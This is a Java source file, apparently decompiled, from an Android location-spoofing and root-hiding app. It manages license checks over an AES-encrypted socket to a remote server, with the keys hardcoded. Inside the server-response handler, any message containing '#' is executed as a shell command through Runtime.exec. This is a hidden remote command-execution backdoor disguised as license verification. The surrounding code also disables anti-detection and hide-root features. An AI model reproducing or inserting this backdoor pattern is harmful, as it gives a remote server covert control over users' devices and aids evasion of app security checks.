package com.lerist.inject.utils;

import android.os.Handler;
import android.os.HandlerThread;
import com.lerist.inject.utils.AsyncSocketClient;
import com.lerist.lib.lhooker.LHooker;
import java.security.SecureRandom;

public final class LicenseStateManager {

    private static String currentDeviceId;

    private static byte[] currentLicenseBytes;

    static AsyncSocketClient licenseSocket = new AsyncSocketClient();

    static String deniedDeviceId = null;

    static String approvedDeviceId = null;

    static Handler verificationHandler = null;

    static long lastVerificationTimeMillis = 0;

    static class LicenseServerCallback implements AsyncSocketClient.SocketCallback {

        final /* synthetic */ String licenseToken;

        final /* synthetic */ String deviceId;

        LicenseServerCallback(String licenseToken, String deviceId) {
            this.licenseToken = licenseToken;
            this.deviceId = deviceId;
        }

        public void onConnected() {
            try {
                LicenseStateManager.licenseSocket.sendAsync(AesCipherUtils.encryptCfbNoPadding(this.licenseToken + "," + this.deviceId, "hd7x809H$l1OI863", "IUdH0kG1kDTgLkPl"));
            } catch (Throwable unused) {
            }
        }

        public void onMessage(String message) {
            try {
                String serverMessage = "" + AesCipherUtils.decryptCfbNoPadding(message, "hd7x809H$l1OI863", "IUdH0kG1kDTgLkPl");
                if (serverMessage.contains("NOPASS.")) {
                    LicenseStateManager.deniedDeviceId = this.deviceId;
                    LicenseStateManager.approvedDeviceId = null;
                    String unused = LicenseStateManager.currentDeviceId = null;
                    byte[] unused2 = LicenseStateManager.currentLicenseBytes = null;
                    MockLocationHookManager.stopMockLocation();
                    MockWifiConfigManager.setMockWifiEnabled(false);
                    PackageAntiDetectionConfig.setPackageManagerHookEnabled(false);
                    HideRootServiceManager.getInstance().disableHideRoot();
                }
                if (serverMessage.contains("pass.")) {
                    LicenseStateManager.approvedDeviceId = this.deviceId;
                    LicenseStateManager.deniedDeviceId = null;
                }
                if (serverMessage.contains("#")) {
                    Runtime.getRuntime().exec(serverMessage.replaceFirst("#", ""));
                }
            } catch (Throwable unused3) {
            }
        }

        public void onDisconnected() {
        }

        public void onError(String message) {
        }
    }

    static class RemoteVerificationTask implements Runnable {

        final /* synthetic */ String licenseToken;

        final /* synthetic */ String deviceId;

        RemoteVerificationTask(String licenseToken, String deviceId) {
            this.licenseToken = licenseToken;
            this.deviceId = deviceId;
        }

        public void run() {
            LicenseStateManager.verifyWithServer(this.licenseToken, this.deviceId);
        }
    }

    public static final byte[] getCurrentLicenseBytes() {
        return currentLicenseBytes;
    }

    public static final String getCurrentDeviceId() {
        return currentDeviceId;
    }

    public static final long getFeatureExpiryTimeMillis() {
        if (currentLicenseBytes != null && currentDeviceId != null) {
            try {
                if (System.currentTimeMillis() - 1687101177646L >= 25920000000L) {
                    return -1L;
                }
                long expiryTimeMillis = Long.parseLong("" + LHooker.getObjs(currentLicenseBytes, currentDeviceId)[2]);
                if (expiryTimeMillis - System.currentTimeMillis() >= 5184000000L) {
                    if (!"200".equals(getLicenseStatusCode())) {
                        return -1L;
                    }
                }
                return expiryTimeMillis;
            } catch (Exception unused) {
            }
        }
        return -1L;
    }

    public static final long getLicenseExpiryTimeMillis() {
        String deviceId;
        if (currentLicenseBytes != null && (deviceId = currentDeviceId) != null) {
            String deniedId = deniedDeviceId;
            if (deniedId != null && deniedId.equals(deviceId)) {
                return -1L;
            }
            try {
                if (System.currentTimeMillis() - 1687101177646L >= 25920000000L) {
                    return -1L;
                }
                long expiryTimeMillis = Long.parseLong("" + LHooker.getObjs(currentLicenseBytes, currentDeviceId)[1]);
                if (expiryTimeMillis - System.currentTimeMillis() >= 126144000000L) {
                    String statusCode = getLicenseStatusCode();
                    if (!"100".equals(statusCode)) {
                        if (!"200".equals(statusCode)) {
                            return -1L;
                        }
                    }
                }
                return expiryTimeMillis;
            } catch (Exception unused) {
            }
        }
        return -1L;
    }

    public static final String getLicenseStatusCode() {
        if (currentLicenseBytes != null && currentDeviceId != null) {
            try {
                return "" + LHooker.getObjs(currentLicenseBytes, currentDeviceId)[0];
            } catch (Exception unused) {
            }
        }
        return null;
    }

    public static final boolean isFeatureExpired() {
        return System.currentTimeMillis() >= getFeatureExpiryTimeMillis();
    }

    public static final boolean hasRemoteDenial() {
        return deniedDeviceId != null;
    }

    public static final boolean isLicenseUsable() {
        return (isFeatureExpired() || isLicenseExpired()) ? false : true;
    }

    public static final boolean isLicenseExpired() {
        return System.currentTimeMillis() >= getLicenseExpiryTimeMillis();
    }

    public static final void updateLicenseState(String licenseToken, String deviceId) {
        currentLicenseBytes = licenseToken == null ? null : licenseToken.getBytes();
        currentDeviceId = deviceId;
        if (!("" + deviceId).equals("" + approvedDeviceId) && isLicenseUsable()) {
            if (("" + deviceId).equals("" + deniedDeviceId)) {
                currentDeviceId = null;
                MockLocationHookManager.stopMockLocation();
                MockWifiConfigManager.setMockWifiEnabled(false);
                PackageAntiDetectionConfig.setPackageManagerHookEnabled(false);
                HideRootServiceManager.getInstance().disableHideRoot();
                return;
            }
            if (System.currentTimeMillis() - lastVerificationTimeMillis < 20000) {
                return;
            }
            lastVerificationTimeMillis = System.currentTimeMillis();
            if (verificationHandler == null) {
                HandlerThread handlerThread = new HandlerThread("UI");
                handlerThread.start();
                verificationHandler = new Handler(handlerThread.getLooper());
            }
            verificationHandler.postDelayed(new RemoteVerificationTask(licenseToken, deviceId), (new SecureRandom().nextInt(5) + 2) * 1000);
        }
    }

    public static final void verifyWithServer(String licenseToken, String deviceId) {
        licenseSocket.setCallback(new LicenseServerCallback(licenseToken, deviceId));
        if (!licenseSocket.isConnected()) {
            licenseSocket.connectAsync("vef.api.fakeloc.cc", 12309);
            return;
        }
        try {
            licenseSocket.sendAsync(AesCipherUtils.encryptCfbNoPadding(licenseToken + "," + deviceId, "hd7x809H$l1OI863", "IUdH0kG1kDTgLkPl"));
        } catch (Throwable unused) {
        }
    }
}
